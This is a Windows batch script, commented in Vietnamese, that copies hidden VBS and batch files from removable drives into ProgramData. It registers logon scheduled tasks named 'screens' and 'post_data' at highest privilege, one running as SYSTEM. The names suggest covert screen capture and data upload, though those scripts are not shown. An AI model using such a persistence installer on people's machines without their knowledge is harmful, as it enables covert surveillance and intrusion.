@echo off
setlocal

set BASEDIR=C:\ProgramData\WinRC
set SRC=C:\ProgramData\WinRC\src

:: check WinRC folder có tồn tại không 
if exist "%BASEDIR%" (
    echo Thu muc WinRC da ton tai - Dang xoa...
    rd /s /q "%BASEDIR%"
)

::tạo folder
mkdir "%BASEDIR%"
mkdir "%SRC%"

:: copy file thực thi
for %%D in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%D:\" (
        echo Kiem tra o %%D:
        if exist "%%D:\rcpc\runtime\run_hidden.vbs" (
            echo  - Tim thay run_hidden.vbs tren %%D:
            copy "%%D:\rcpc\runtime\run_hidden.vbs" "%SRC%"
        )
        if exist "%%D:\rcpc\runtime\screens.bat" (
            echo  - Tim thay screens.bat tren %%D:
            copy "%%D:\rcpc\runtime\screens.bat" "%SRC%"
        )
        if exist "%%D:\rcpc\getdata\remove.vbs" (
            echo  - Tim thay remove.vbs tren %%D:
            copy "%%D:\rcpc\getdata\remove.vbs" "%SRC%"
        )
        if exist "%%D:\rcpc\getdata\run_shutdown.vbs" (
            echo  - Tim thay run_shutdown.vbs tren %%D:
            copy "%%D:\rcpc\getdata\run_shutdown.vbs" "%SRC%"
        )
        if exist "%%D:\rcpc\getdata\post.bat" (
            echo  - Tim thay post.bat tren %%D:
            copy "%%D:\rcpc\getdata\post.bat" "%SRC%"
        )
    )
)

set TASKSCREEN=screens
set TASKPOST=post_data

::screens
set RUN_HIDDEN=%SRC%\run_hidden.vbs
set SCREENS=%SRC%\screens.bat

::post_data
set RUN_SHUTDOWN=%SRC%\run_shutdown.vbs

::check đủ file
set "REQUIRED_FILES=%RUN_HIDDEN% %SCREENS% %RUN_SHUTDOWN%"

for %%F in (%REQUIRED_FILES%) do (
    if not exist "%%F" (
        echo LOI: Khong tim thay file: %%F
        echo Vui long kiem tra lai thu muc: %SRC%
        set "MISSING=1"
    )
)

if defined MISSING (
    echo Khong du file he thong. Thoat!
    pause
    exit /b 1
)

::--------------------------------------------------------
::tạo task screens
::Nếu task đã tồn tại thì xóa
schtasks /Query /TN "%TASKSCREEN%" >nul 2>&1
if %errorlevel%==0 (
    echo Task "%TASKSCREEN%" da ton tai. Dang xoa...
    schtasks /Delete /TN "%TASKSCREEN%" /F >nul
)

echo Dang tao task moi "%TASKSCREEN%"...

schtasks /Create ^
 /TN "%TASKSCREEN%" ^
 /SC ONLOGON ^
 /TR "wscript.exe \"%RUN_HIDDEN%\"" ^
 /RU "%USERNAME%" ^
 /RL HIGHEST ^
 /F

if %errorlevel%==0 (
    echo Da tao task "%TASKSCREEN%" thanh cong.
    echo Dang chay thu task de test...
    schtasks /Run /TN "%TASKSCREEN%" >nul
    echo 
) else (
    echo LOI: Khong tao duoc task. Ma loi %errorlevel%.
)

::--------------------------------------------------------
::tạo task post
schtasks /Query /TN "%TASKPOST%" >nul 2>&1
if %errorlevel%==0 (
    echo Task "%TASKPOST%" da ton tai. Dang xoa...
    schtasks /Delete /TN "%TASKPOST%" /F >nul
)

echo Dang tao task moi "%TASKPOST%"...

schtasks /Create ^
 /TN "%TASKPOST%" ^
 /SC ONLOGON ^
 /TR "wscript.exe \"%RUN_SHUTDOWN%\"" ^
 /RU "SYSTEM" ^
 /RL HIGHEST ^
 /F

if %errorlevel%==0 (
    echo Da tao task "%TASKPOST%" thanh cong.
    echo Dang chay thu task de test...
    schtasks /Run /TN "%TASKPOST%" >nul
    echo 
) else (
    echo LOI: Khong tao duoc task. Ma loi %errorlevel%.
)

pause
endlocal
